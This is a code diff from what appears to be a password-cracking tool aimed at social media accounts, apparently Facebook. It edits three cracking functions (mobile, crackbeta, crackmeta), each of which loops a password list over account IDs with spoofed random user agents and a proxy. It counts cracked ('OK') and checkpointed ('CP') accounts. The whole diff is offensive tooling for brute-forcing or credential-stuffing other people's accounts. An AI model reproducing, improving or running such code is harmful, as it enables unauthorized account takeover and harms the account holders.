@@ -968,12 +968,15 @@ def cektahun(fx):
 	return tahunz
 #--------------------[ METODE-MOBILE ]-----------------#
 def mobile(idf,shinoby_pass):
-	global loop,ok,cp
+	global loop
+	global ok
+	global cp
+	global proxy
 	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
 	sys.stdout.write(f"\r {animasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
 	sys.stdout.flush()
-	ua = random.choice(vinzsector)
-	ua2 = random.choice(vinzsector2)
+	ua = random.choice(shinoby10)
+	ua2 = random.choice(shinoby10_random)
 	ses = requests.Session()
 	for pw in shinoby_pass:
 		try:
@@ -1010,12 +1013,16 @@ def mobile(idf,shinoby_pass):
 	loop+=1
 #---------------------[ METHODE-BETA ]---------------------#
 def crackbeta(idf,shinoby_pass):
-	global loop,ok,cp
-	ua = random.choice(vinzsector)
-	ua2 = random.choice(vinzsector2)
-	ses = requests.Session()
-	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m??","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m??","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
+	global loop
+	global ok
+	global cp
+	global proxy
+	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
+	sys.stdout.write(f"\r {animasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
 	sys.stdout.flush()
+	ua = random.choice(shinoby10)
+	ua2 = random.choice(shinoby10_random)
+	ses = requests.Session()
 	for pw in shinoby_pass:
 		try:
 			#if 'ya' in ualuh: ua = ualu[0]
@@ -1073,12 +1080,15 @@ def crackbeta(idf,shinoby_pass):
 	loop+=1
 ###----------[  METHODE-MOBILE-META ]----------###
 def crackmeta(idf,shinoby_pass):
-	global loop,ok,cp
+	global loop
+	global ok
+	global cp
+	global proxy
 	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
 	sys.stdout.write(f"\r {animasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
 	sys.stdout.flush()
-	ua = random.choice(vinzsector)
-	ua2 = random.choice(vinzsector2)
+	ua = random.choice(shinoby10)
+	ua2 = random.choice(shinoby10_random)
 	ses = requests.Session()
 	for pw in shinoby_pass:
 		try:
